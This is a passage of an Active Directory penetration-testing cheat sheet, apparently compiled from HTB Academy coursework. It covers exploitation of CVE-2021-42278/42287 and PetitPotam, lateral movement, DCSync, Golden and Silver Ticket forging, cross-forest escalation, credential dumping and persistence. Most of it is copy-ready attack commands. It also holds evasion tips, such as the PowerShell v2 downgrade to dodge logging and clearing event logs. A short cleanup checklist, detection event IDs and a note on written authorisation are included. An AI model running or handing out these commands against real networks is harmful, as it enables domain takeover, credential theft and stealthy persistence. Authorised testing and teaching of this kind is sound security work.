### 5.9 — noPac / SamAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)

```
REQUIREMENTS: Any standard domain user, ms-DS-MachineAccountQuota > 0 (default = 10)
IMPACT: Standard user → Domain Admin in one command

CHECK:
  sudo python3 scanner.py DOMAIN.LOCAL/<user>:<pass> -dc-ip <DC_IP> -use-ldap
  Look for: "ms-DS-MachineAccountQuota = 10" and successful TGT

ATTACK — SYSTEM shell:
  sudo python3 noPac.py DOMAIN.LOCAL/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_hostname> -shell --impersonate administrator -use-ldap

ATTACK — DCSync:
  sudo python3 noPac.py DOMAIN.LOCAL/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_hostname> --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator

Location: /opt/noPac/
```

### 5.10 — PetitPotam + AD CS (CVE-2021-36942)

```
REQUIREMENTS: AD Certificate Services (AD CS) present, no authentication needed
IMPACT: Coerce DC authentication → relay to AD CS → get DC certificate → DCSync

CHECK FOR AD CS:
  crackmapexec smb <DC_IP> -u <user> -p <pass> -M adcs
  OR: rpcdump.py @<DC_IP> | grep -i cert

ATTACK:
  Step 1: Start ntlmrelayx targeting AD CS web enrollment
    sudo ntlmrelayx.py -debug -smb2support \
      --target http://<CA_HOST>/certsrv/certfnsh.asp \
      --adcs --template DomainController

  Step 2: Trigger coercion from DC
    python3 PetitPotam.py <attacker_IP> <DC_IP>

  Step 3: Get base64 certificate from ntlmrelayx output

  Step 4: Request TGT using certificate
    python3 gettgtpkinit.py DOMAIN.LOCAL/<DC_hostname>$ -pfx-base64 <base64_cert> dc01.ccache
    export KRB5CCNAME=dc01.ccache

  Step 5: DCSync
    secretsdump.py -just-dc-user DOMAIN/administrator -k -no-pass <DC_FQDN>

FROM WINDOWS (Rubeus):
    .\Rubeus.exe asktgt /user:<DC_hostname>$ /certificate:<base64_cert> /ptt
    .\mimikatz.exe → lsadump::dcsync /user:DOMAIN\administrator
```

---

## Phase 6 — Lateral Movement

> **Goal:** Move to other hosts in the network, particularly those with privileged users active.

### 6.1 — Decision Tree: Which Lateral Movement Method

```
YOU HAVE: Credentials (cleartext or hash) + target host
│
├─► Got cleartext password?
│     └─► Any method works: PSExec, WinRM, RDP, CrackMapExec
│
├─► Got NTLM hash only (no cleartext)?
│     └─► Pass-the-Hash: CME, PSExec, WinRM with -H flag
│
├─► Got Kerberos TGT/TGS ticket?
│     └─► Pass-the-Ticket: Rubeus /ptt, then access resources
│
├─► Got local admin on source but not target?
│     └─► Token impersonation, or hunt for DA sessions on local host
│
└─► Working from domain-joined host with current user?
      └─► Test-AdminAccess, Find-LocalAdminAccess (PowerView)
```

### 6.2 — Pass-the-Hash (PTH)

```
REQUIREMENT: NTLM hash of target user (local or domain admin)

FROM LINUX:
  crackmapexec smb <target_IP> -u <user> -H <NTLM_hash>
  crackmapexec smb <target_IP> -u <user> -H <NTLM_hash> -x "whoami"
  psexec.py DOMAIN/<user>@<target_IP> -hashes :<NTLM_hash>
  wmiexec.py DOMAIN/<user>@<target_IP> -hashes :<NTLM_hash>
  evil-winrm -i <target_IP> -u <user> -H <NTLM_hash>

FROM WINDOWS (Mimikatz):
  sekurlsa::pth /user:<user> /rc4:<NTLM_hash> /domain:DOMAIN /run:powershell.exe
  → spawns new powershell running as target user
```

### 6.3 — Pass-the-Ticket (PTT)

```
REQUIREMENT: Valid Kerberos TGT or TGS

Extract ticket from memory (Windows — requires local admin):
  mimikatz # sekurlsa::tickets /export           ← exports .kirbi files
  .\Rubeus.exe dump /nowrap                       ← base64 ticket blobs

Inject ticket (Windows):
  mimikatz # kerberos::ptt <ticket.kirbi>
  .\Rubeus.exe ptt /ticket:<base64_ticket>
  Verify: klist

Use ticket (Linux):
  export KRB5CCNAME=ticket.ccache
  psexec.py -k -no-pass DOMAIN/<user>@<target_FQDN>
  smbclient.py -k DOMAIN/<user>@<target_FQDN>
```

### 6.4 — WinRM / PSRemoting

```
CHECK ACCESS:
  BloodHound → CanPSRemote edge
  Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Management Users"

FROM LINUX:
  evil-winrm -i <target_IP> -u <user> -p <pass>
  evil-winrm -i <target_IP> -u <user> -H <NTLM_hash>

FROM WINDOWS:
  $cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
  Enter-PSSession -ComputerName <target> -Credential $cred

  Fix Double-Hop problem (register new session config):
    Register-PSSessionConfiguration -Name adminsess -RunAsCredential DOMAIN\user
    Restart-Service WinRM
    Enter-PSSession -ComputerName <target> -Credential $cred -ConfigurationName adminsess
```

### 6.5 — PSExec / Remote Execution

```
FROM LINUX (Impacket):
  psexec.py DOMAIN/<user>:<pass>@<target_IP>           ← SYSTEM shell
  wmiexec.py DOMAIN/<user>:<pass>@<target_IP>          ← user-context shell, stealthier
  smbexec.py DOMAIN/<user>:<pass>@<target_IP>          ← no binary drop, uses services
  atexec.py DOMAIN/<user>:<pass>@<target_IP> "command" ← scheduled task execution

  NOTE: wmiexec is stealthier (no service creation) but generates WMI events
  NOTE: psexec drops a binary to ADMIN$ — may trigger AV

FROM WINDOWS:
  .\PsExec64.exe \\<target> -u DOMAIN\user -p pass cmd.exe
```

### 6.6 — RDP

```
CHECK ACCESS:
  BloodHound → CanRDP edge
  Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Desktop Users"

FROM LINUX:
  xfreerdp /v:<target_IP> /u:DOMAIN\\user /p:password
  xfreerdp /v:<target_IP> /u:user /pth:<NTLM_hash>   ← Restricted Admin mode

FROM WINDOWS:
  mstsc.exe → connect
  Or: cmdkey /generic:<target> /user:DOMAIN\user /pass:password → mstsc /v:<target>
```

### 6.7 — MSSQL Lateral Movement

```
CHECK ACCESS:
  BloodHound → SQLAdmin edge
  PowerUpSQL: Get-SQLInstanceDomain → Get-SQLQuery -Verbose -Instance "<host>,1433" -username "DOMAIN\user" -password "pass" -query 'Select @@version'

FROM LINUX:
  mssqlclient.py DOMAIN/user:pass@<target_IP> -windows-auth
  SQL> enable_xp_cmdshell
  SQL> xp_cmdshell whoami

PRIVILEGE:
  SA / sysadmin → enable xp_cmdshell → OS commands as SQL service account
  Service account almost always has SeImpersonatePrivilege → JuicyPotato / PrintSpoofer → SYSTEM
```

---

## Phase 7 — Domain Compromise

> **Goal:** Achieve full control of the domain. Obtain Domain Admin credentials or equivalent.

### 7.1 — DCSync Attack

```
REQUIREMENT: Account with DS-Replication-Get-Changes-All rights
  (Domain Admins, Enterprise Admins, or any account you granted DCSync via WriteDACL)

CHECK RIGHTS (PowerView):
  $sid = Convert-NameToSid <user>
  Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get') -and ($_.SecurityIdentifier -match $sid)}

FROM LINUX:
  secretsdump.py -just-dc DOMAIN/<user>:<pass>@<DC_IP>
  secretsdump.py -just-dc-user DOMAIN/administrator DOMAIN/<user>:<pass>@<DC_IP>
  secretsdump.py -just-dc-ntlm DOMAIN/<user>:<pass>@<DC_IP>
  secretsdump.py -just-dc-user DOMAIN/krbtgt DOMAIN/<user>:<pass>@<DC_IP>   ← for Golden Ticket

  Flags:
    -pwd-last-set     ← show when passwords were last changed
    -history          ← dump password history
    -user-status      ← show disabled accounts

FROM WINDOWS (Mimikatz — run as DCSync-privileged user):
  lsadump::dcsync /user:DOMAIN\administrator
  lsadump::dcsync /user:DOMAIN\krbtgt
  lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator   ← cross-domain

  If not running as privileged user, use runas first:
    runas /netonly /user:DOMAIN\privileged_user powershell
    Then run Mimikatz in that shell

OUTPUT:
  NTLM hash for administrator → PTH to any host
  NTLM hash for krbtgt → create Golden Ticket
  AES256 key for krbtgt → create stronger Golden Ticket
```

### 7.2 — Golden Ticket

```
REQUIREMENT: krbtgt NTLM hash (from DCSync)
IMPACT: Persistent DA-level access; survives password changes except krbtgt rotation

COLLECT REQUIRED DATA:
  KRBTGT hash:     secretsdump.py / mimikatz dcsync → krbtgt NTLM hash
  Domain SID:      Get-DomainSID  OR  lookupsid.py DOMAIN/<user>:<pass>@<DC_IP> | grep "Domain SID"
  Target username: Can be fake (e.g. "hacker") or real
  Domain FQDN:     DOMAIN.LOCAL

FROM WINDOWS (Mimikatz):
  kerberos::golden /user:administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXX /krbtgt:<NTLM_hash> /ptt
  klist   ← verify ticket in memory
  dir \\DC\C$   ← test access

FROM LINUX:
  ticketer.py -nthash <KRBTGT_hash> -domain DOMAIN.LOCAL -domain-sid <domain_SID> administrator
  export KRB5CCNAME=administrator.ccache
  psexec.py -k -no-pass DOMAIN.LOCAL/administrator@<DC_FQDN>

PERSISTENCE: Golden Ticket valid for 10 years by default
DETECTION: Unusual TGT lifetime; ticket not from KDC; event ID 4768
MITIGATION: Rotate krbtgt password TWICE (invalidates all tickets)
```

### 7.3 — Silver Ticket

```
REQUIREMENT: Service account NTLM hash
IMPACT: Access to specific service on target host without contacting KDC (stealthier)

mimikatz # kerberos::golden /user:<user> /domain:DOMAIN.LOCAL /sid:<domain_SID> /target:<target_host> /service:cifs /rc4:<service_NTLM_hash> /ptt
```

---

## Phase 8 — Cross-Trust & Forest Attacks

> **Goal:** Leverage trust relationships to compromise additional domains and forests.

### 8.1 — Enumerate Trusts

```
PowerView:
  Get-DomainTrust
  Get-DomainTrustMapping
  Get-ForestTrust

AD Module:
  Get-ADTrust -Filter *

netdom:
  netdom query /domain:<domain> trust

BloodHound:
  "Map Domain Trusts" query → visual map of all trust relationships

KEY INFO TO NOTE:
  Trust direction (bidirectional vs one-way → which way can you auth)
  Trust type (within-forest vs forest-transitive vs external)
  SID filtering enabled? (if yes, SID history attacks blocked)
```

### 8.2 — Child → Parent Domain Escalation (ExtraSids Attack)

```
SCENARIO: You own a child domain (LOGISTICS.INLANEFREIGHT.LOCAL), want parent (INLANEFREIGHT.LOCAL)
REQUIREMENT: krbtgt hash of child domain

COLLECT DATA:
  1. Child domain krbtgt hash:
       mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
       secretsdump.py logistics.domain.local/<user>@<child_DC_IP> -just-dc-user LOGISTICS/krbtgt

  2. Child domain SID:
       Get-DomainSID
       lookupsid.py domain/<user>:<pass>@<child_DC_IP> | grep "Domain SID"

  3. Enterprise Admins SID (from parent domain):
       Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
       lookupsid.py domain/<user>:<pass>@<parent_DC_IP> | grep "Enterprise Admins"
       → Format: <parent_domain_SID>-519

  4. Child domain FQDN

FROM WINDOWS (Mimikatz):
  kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<child_SID> /krbtgt:<child_KRBTGT_hash> /sids:<parent_EA_SID> /ptt
  klist → verify
  ls \\parent-DC\C$   ← confirm access
  mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator /domain:INLANEFREIGHT.LOCAL

FROM LINUX (ticketer.py):
  ticketer.py -nthash <child_KRBTGT_hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <child_SID> -extra-sid <parent_EA_SID> hacker
  export KRB5CCNAME=hacker.ccache
  psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@<parent_DC_FQDN> -k -no-pass -target-ip <parent_DC_IP>

AUTOMATED (raiseChild.py):
  raiseChild.py -target-exec <parent_DC_IP> LOGISTICS.INLANEFREIGHT.LOCAL/<child_admin>:<pass>
  → Fully automated child → parent compromise
```

### 8.3 — Cross-Forest Kerberoasting

```
SCENARIO: Bidirectional forest trust exists

FROM LINUX:
  GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/<user>:<pass>
  GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/<user>:<pass>
  hashcat -m 13100 hash.txt wordlist.txt

FROM WINDOWS:
  .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /nowrap

After cracking:
  Test auth in foreign domain
  Check if same password used in current domain (password reuse)
```

### 8.4 — Cross-Forest Foreign Group Membership Abuse

```
SCENARIO: Users from Domain A are members of groups in Domain B

DISCOVERY:
  Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
  Convert-SidToName <SID>

ATTACK:
  If INLANEFREIGHT\administrator is in FREIGHTLOGISTICS\Administrators:
    Enter-PSSession -ComputerName <foreign_DC_FQDN> -Credential INLANEFREIGHT\administrator
    → Instant DA on foreign domain

BloodHound:
  "Users with Foreign Domain Group Membership" query
  Select source domain → see who has access to foreign domain
```

### 8.5 — SID History Abuse (Cross-Forest)

```
SCENARIO: SID filtering disabled on a forest trust, user migrated with SID history

ATTACK:
  mimikatz # privilege::debug
  mimikatz # misc::addsid /user:<user> /sids:<privileged_SID_from_other_forest>
  → User now has rights in the other forest when authenticating across the trust
```

---

## Phase 9 — Post-Compromise & Persistence

> **Goal:** Maintain access, gather evidence, clean up, and report.

### 9.1 — Credential Dumping (Post-DA)

```
FROM WINDOWS (Mimikatz — on DC or any host):
├─► LSASS dump (live):
│     mimikatz # privilege::debug
│     mimikatz # sekurlsa::logonpasswords          ← cleartext + hashes from memory
│     mimikatz # sekurlsa::wdigest                 ← wdigest cleartext (legacy)
│     mimikatz # sekurlsa::kerberos                ← Kerberos tickets
│
├─► SAM database (local accounts):
│     mimikatz # lsadump::sam
│
├─► DCSync (domain-wide):
│     mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
│
└─► NTDS.dit offline extraction:
      secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

FROM LINUX (remote):
  secretsdump.py DOMAIN/<user>:<pass>@<DC_IP>                    ← full domain dump
  secretsdump.py DOMAIN/<user>@<target_IP> -hashes :<NTLM_hash>  ← PTH-based dump
```

### 9.2 — Persistence Mechanisms

```
├─► Golden Ticket (most reliable)
│     Keep krbtgt hash; generate new ticket whenever needed
│     Note: Survives regular password changes; only krbtgt password rotation invalidates it
│
├─► DCSync rights via ACL (stealth persistence)
│     Add-DomainObjectACL -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <backdoor_user> -Rights DCSync
│     → Low-priv looking account silently has DCSync rights
│
├─► AdminSDHolder abuse
│     Add user to AdminSDHolder DACL → SDProp process propagates rights to all protected groups every 60 min
│
└─► Skeleton Key (risky — in-memory only, lost on reboot)
      mimikatz # misc::skeleton
      → All accounts accept "mimikatz" as password while loaded
```

### 9.3 — Cleanup Checklist

```
ALWAYS document and revert every change:

□ Remove any fake SPNs set during ACL abuse
  Set-DomainObject -Identity <user> -Clear serviceprincipalname

□ Remove yourself from any groups you joined
  Remove-DomainGroupMember -Identity "<group>" -Members '<your_user>' -Credential $Cred

□ Reset any passwords you changed (or alert client to reset them)

□ Remove any DCSync rights granted to backdoor accounts

□ Remove any GPO changes

□ Delete any binaries/tools uploaded to target hosts

□ Clear event logs (only if client authorises): wevtutil cl Security

□ Document all actions in assessment notes with timestamps
```

### 9.4 — Evidence Collection for Report

```
COLLECT AND SAVE:
├─► All Nmap scan output (-oA)
├─► BloodHound data exports
├─► PingCastle HTML report
├─► All Responder/Inveigh captured hashes
├─► All cracked credentials (store securely)
├─► Screenshots of DA/EA access (dir \\DC\C$, whoami /all)
├─► secretsdump output (stored securely, not in report body)
├─► List of all hosts accessed
├─► Timestamps of all actions
└─► Any sensitive data discovered (note existence, do not exfiltrate personal data)

AUDIT TOOLS TO RUN FOR CLIENT:
  PingCastle: PingCastle.exe → healthcheck → HTML report
  Group3r:    group3r.exe -f gpo_findings.log    ← GPO vulnerability analysis
  ADRecon:    .\ADRecon.ps1                       ← comprehensive AD audit
  AD Explorer: Create snapshot for offline analysis
```

---

## Defensive Evasion Notes

> Use these techniques to reduce noise and avoid triggering defenses.

```
├─► Downgrade PowerShell to v2 (disables Script Block Logging)
│     powershell.exe -version 2
│     Verify: Get-Host → Version: 2.0
│     NOTE: Still logs the downgrade attempt itself
│
├─► Use net1 instead of net (bypasses basic "net" command monitoring)
│     net1 user /domain  instead of  net user /domain
│
├─► Use Kerbrute for username enum (no 4625 events)
│
├─► Use wmiexec.py instead of psexec.py (no binary drop, no service creation)
│
├─► Use CrackMapExec with --timeout and --jitter for slower, quieter execution
│
├─► Living off the land — prefer built-in tools:
│     dsquery, net, nltest, wmic, netdom, ipconfig, arp, route
│
├─► LDAP queries instead of SMB (fewer SMB event logs)
│
├─► Avoid running BloodHound ingestor from the DC directly
│
└─► Spray timing: Never exceed lockout threshold - 2 attempts per observation window
      If policy = lockout after 5 / reset after 30 min → max 3 sprays, wait 31 min between rounds
```

---

## Quick Reference — Tool Index

|Tool|Platform|Purpose|Phase|
|---|---|---|---|
|BGP Toolkit / ARIN|Web|IP/ASN discovery|1|
|linkedin2username|Linux|Username harvesting from LinkedIn|1|
|Dehashed|Web/CLI|Breach data lookup|1|
|Wireshark / tcpdump|Linux|Passive network capture|2|
|Responder (-A mode)|Linux|Passive LLMNR/MDNS listener|2|
|fping|Linux|ICMP sweep|2|
|Nmap|Linux/Win|Port/service scan|2|
|enum4linux / enum4linux-ng|Linux|SMB/RPC enumeration|2|
|rpcclient|Linux|RPC enumeration|2|
|ldapsearch|Linux|LDAP enumeration|2|
|windapsearch.py|Linux|LDAP user/group dump|2|
|Kerbrute|Linux/Win|Username enum, password spray|2/3|
|Responder|Linux|LLMNR/NBT-NS poisoning|3|
|Inveigh|Windows|LLMNR/NBT-NS poisoning (Win)|3|
|hashcat|Linux|Offline hash cracking|3/5|
|CrackMapExec (CME)|Linux|Swiss army knife — enum/spray/exec|3/4/6|
|BloodHound.py|Linux|AD data collection|4|
|SharpHound|Windows|AD data collection|4|
|BloodHound GUI|Win/Linux|Attack path visualisation|4|
|PowerView|Windows|AD enumeration / ACL analysis|4/5|
|SharpView|Windows|.NET port of PowerView|4/5|
|AD PowerShell Module|Windows|Built-in AD enumeration|4|
|SMBMap|Linux|Share enumeration|4|
|Snaffler|Windows|Credential hunting in shares|4|
|adidnsdump|Linux|DNS zone enumeration|4|
|GetUserSPNs.py|Linux|Kerberoasting|5|
|GetNPUsers.py|Linux|ASREPRoasting|5|
|Rubeus|Windows|Kerberos attacks (roast/PTT/etc)|5/6|
|SharpGPOAbuse|Windows|GPO abuse|5|
|LAPSToolkit|Windows|LAPS password extraction|5|
|noPac.py|Linux|SamAccountName spoofing|5|
|CVE-2021-1675.py|Linux|PrintNightmare exploit|5|
|ntlmrelayx.py|Linux|NTLM relay (PetitPotam/AD CS)|5|
|PetitPotam.py|Linux|MS-EFSRPC coercion|5|
|gettgtpkinit.py|Linux|Certificate-based TGT request|5|
|psexec.py|Linux|Remote SYSTEM shell|6|
|wmiexec.py|Linux|Stealthy remote execution|6|
|smbexec.py|Linux|SMB-based remote execution|6|
|evil-winrm|Linux|WinRM shell|6|
|mssqlclient.py|Linux|MSSQL shell|6|
|Mimikatz|Windows|Credential dumping / Golden Ticket|6/7|
|secretsdump.py|Linux|Remote credential dumping / DCSync|7|
|ticketer.py|Linux|Kerberos ticket forging|7/8|
|lookupsid.py|Linux|SID brute-forcing|8|
|raiseChild.py|Linux|Automated child→parent escalation|8|
|getnthash.py|Linux|NT hash from TGT (U2U)|8|
|PingCastle|Windows|AD security audit report|9|
|Group3r|Windows|GPO vulnerability analysis|9|
|ADRecon|Windows|Comprehensive AD audit|9|
|AD Explorer|Windows|AD snapshot and comparison|9|

---

## Key Event IDs to Know (Detection Reference)

|Event ID|Description|Triggered By|
|---|---|---|
|4625|Account failed to log on|Password spraying (SMB/LDAP)|
|4768|Kerberos TGT requested|Kerbrute enum, valid logins|
|4769|Kerberos TGS requested|Kerberoasting (RC4 = suspicious)|
|4771|Kerberos pre-auth failed|ASREPRoasting, spray via Kerberos|
|4697|Service installed|PSExec, smbexec|
|4688|New process created|wmiexec (cmd.exe children)|
|5136|AD object modified|ACL abuse, DCSync rights grant|
|4670|Object permissions changed|ACL modifications|
|4728/4732/4756|Member added to group|Group membership changes|

---

_Methodology compiled from HTB Academy: Active Directory Enumeration & Attacks module._ _Always operate within the scope of written authorisation. Document everything._